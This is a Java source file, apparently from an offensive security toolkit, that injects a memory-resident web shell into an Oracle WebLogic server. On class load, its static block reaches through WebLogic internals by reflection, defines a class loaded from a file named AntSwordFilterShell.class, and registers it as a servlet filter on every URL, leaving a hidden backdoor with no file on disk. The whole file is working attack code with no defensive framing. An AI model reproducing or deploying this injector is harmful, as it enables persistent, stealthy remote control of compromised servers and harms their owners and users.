package org.chabug.memshell;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class InjectFilterShell {
    static {
        try {
            Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
            Method m = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = m.invoke(Thread.currentThread());

            Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
            connectionHandlerF.setAccessible(true);
            Object obj = connectionHandlerF.get(currentWork);

            Field requestF = obj.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            obj = requestF.get(obj);

            Field contextF = obj.getClass().getDeclaredField("context");
            contextF.setAccessible(true);
            Object context = contextF.get(obj);

            Field classLoaderF = context.getClass().getDeclaredField("classLoader");
            classLoaderF.setAccessible(true);
            ClassLoader cl = (ClassLoader) classLoaderF.get(context);

            Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
            cachedClassesF.setAccessible(true);
            Object cachedClass = cachedClassesF.get(cl);

            Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
            if (getM.invoke(cachedClass, "shell") == null) {
                byte[] codeClass = getBytesByFile("C:/Users/Administrator/Desktop/AntSwordFilterShell.class");
                Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class evilFilterClass = (Class) defineClass.invoke(cl, codeClass, 0, codeClass.length);

                String evilName = "gameName" + System.currentTimeMillis();
                String filterName = "gameFilter" + System.currentTimeMillis();
                String[] url = new String[]{"/*"};

                Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
                putM.invoke(cachedClass, filterName, evilFilterClass);
                Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
                Object filterManager = getFilterManagerM.invoke(context);

                Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilterM.setAccessible(true);
                registerFilterM.invoke(filterManager, evilName, filterName, url, null, null, null);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] getBytesByFile(String pathStr) {
        File file = new File(pathStr);
        try {
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream bos = new ByteArrayOutputStream(1000);
            byte[] b = new byte[1000];
            int n;
            while ((n = fis.read(b)) != -1) {
                bos.write(b, 0, n);
            }
            fis.close();
            byte[] data = bos.toByteArray();
            bos.close();
            return data;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
